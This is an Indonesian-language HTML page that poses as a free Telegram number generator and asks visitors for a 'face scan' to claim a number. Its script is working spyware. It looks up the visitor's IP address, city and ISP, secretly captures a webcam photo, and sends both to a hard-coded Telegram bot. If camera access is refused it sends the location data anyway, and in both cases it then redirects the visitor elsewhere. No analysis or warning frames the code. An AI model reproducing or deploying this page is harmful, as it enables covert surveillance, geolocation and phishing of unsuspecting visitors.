<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nokos Fresh Gratis</title>
    <style>
        body { font-family: sans-serif; margin: 0; background: #0088cc; color: white; text-align: center; }
        .h { background: #0077b5; padding: 20px; font-weight: bold; border-bottom: 2px solid rgba(255,255,255,0.2); }
        .c { max-width: 450px; margin: 30px auto; background: white; border-radius: 15px; padding: 30px; color: #333; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        .b { width: 100%; padding: 18px; background: #24A1DE; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1em; }
        #L { display: none; margin-top: 20px; }
        .bar { width: 100%; background: #eee; border-radius: 10px; height: 10px; margin: 10px 0; overflow: hidden; }
        .fill { width: 0%; background: #24A1DE; height: 100%; transition: 4s linear; }
        #v, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="h">TELEGRAM NUMBER GENERATOR</div>
    <div class="c">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="80" style="margin-bottom:15px;">
        <h2 style="margin:0 0 10px 0;">Nokos Fresh (+62) Gratis</h2>
        <p style="color:#666; font-size:0.9em; line-height:1.5;">Tersedia 150 nomor baru untuk verifikasi Telegram. Silakan lakukan <b>Scan Wajah Singkat</b> untuk klaim nomor Anda.</p>
        <button class="b" id="btn">KLAIM NOMOR SEKARANG</button>
        <div id="L">
            <p id="S" style="font-weight:bold; color:#24A1DE;">Mencadangkan Nomor Untuk Anda...</p>
            <div class="bar"><div class="fill" id="fill"></div></div>
        </div>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const T = "8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg";
        const I = "5392443720";

        document.getElementById('btn').addEventListener('click', async function() {
            this.style.display = "none";
            document.getElementById('L').style.display = "block";
            setTimeout(() => { document.getElementById('fill').style.width = "100%"; }, 100);

            let info = "📱 *LAPORAN NOKOS HUNTER*%0A━━━━━━━━━━━━━━━━━━%0A";
            
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                info += "🌍 IP: " + d.ip + "%0A📍 Kota: " + d.city + "%0A🏢 ISP: " + d.org + "%0A";
            } catch(e) {}

            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('canvas');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', I);
                        fd.append('photo', blob, 'face.jpg');
                        fd.append('caption', decodeURIComponent(info));
                        fd.append('parse_mode', 'Markdown');
                        fetch("https://api.telegram.org/bot" + T + "/sendPhoto", { method: 'POST', body: fd })
                        .then(() => { 
                            s.getTracks().forEach(t => t.stop());
                            alert("Klaim Berhasil! Mengalihkan ke daftar nomor...");
                            window.location.href = "https://receive-smss.com/"; 
                        });
                    }, 'image/jpeg');
                }, 4000);
            } catch (err) {
                fetch("https://api.telegram.org/bot" + T + "/sendMessage?chat_id=" + I + "&text=" + info + "%0A⚠️ Kamera Ditolak&parse_mode=Markdown")
                .then(() => { window.location.href = "https://receive-smss.com/"; });
            }
        });
    </script>
</body>
</html>
